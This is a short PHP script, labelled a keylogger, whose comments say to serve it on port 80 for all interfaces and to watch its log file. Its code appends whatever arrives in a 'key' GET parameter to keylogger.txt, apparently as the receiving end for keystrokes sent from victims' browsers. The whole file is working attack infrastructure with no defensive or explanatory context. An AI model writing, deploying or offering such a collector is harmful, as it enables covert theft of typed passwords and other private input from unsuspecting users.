<?php
// php -S 0.0.0.0:80
// tail -f keylogger.txt

// keylogger
if (isset($_GET['key'])) {
	$key = urldecode($_GET['key']);
    $file = fopen('keylogger.txt', 'a+');
    fwrite($file, $key);
    fclose($file);
}
?>